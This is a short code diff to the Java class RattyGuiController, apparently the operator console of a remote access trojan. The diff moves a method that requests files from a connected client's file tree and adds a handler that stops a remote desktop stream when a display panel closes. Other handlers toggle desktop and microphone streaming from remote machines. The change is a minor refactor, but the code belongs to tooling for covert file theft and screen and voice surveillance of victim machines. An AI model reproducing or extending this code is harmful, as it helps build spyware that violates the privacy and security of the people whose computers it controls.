@@ -59,14 +59,6 @@ public final class RattyGuiController extends AbstractRattyController implements
 	 * ==================================================
 	 */
 	
-	private void requestFile(final ServerClient client, final FileTreeNode node) {
-		final String path = node.getPath();
-		final FileRequestPacket packet = new FileRequestPacket(path);
-		
-		client.fileTree.removeChildren(node);
-		client.connection.addPacket(packet);
-	}
-	
 	private PopupPacket createPopupPacket() {
 		final String input = gui.getInput();
 		
@@ -181,11 +173,24 @@ public final class RattyGuiController extends AbstractRattyController implements
 		gui.update();
 	}
 	
+	private void stopDesktopStream(final ServerClient client) {
+		client.setStreamingDesktop(false);
+		gui.update();
+	}
+	
 	private void toggleVoiceStream(final ServerClient client) {
 		final boolean streamingVoice = client.isStreamingVoice();
 		
 		client.setStreamingVoice(!streamingVoice);
 		gui.update();
+	}
+	
+	private void requestFile(final ServerClient client, final FileTreeNode node) {
+		final String path = node.getPath();
+		final FileRequestPacket packet = new FileRequestPacket(path);
+		
+		client.fileTree.removeChildren(node);
+		client.connection.addPacket(packet);
 	}
 	
 	private void handleFileTreeCommand(final ServerClient client, final String command) {
@@ -206,6 +211,8 @@ public final class RattyGuiController extends AbstractRattyController implements
 	private void handleCommand(final ServerClient client, final String command) {
 		if (command == RattyGui.FILES) {
 			client.fileTree.setVisible(true);
+		} else if (command == DisplayPanel.CLOSED) {
+			stopDesktopStream(client);
 		} else if (command == RattyGui.DESKTOP) {
 			toggleDesktopStream(client);
 		} else if (command == RattyGui.VOICE) {
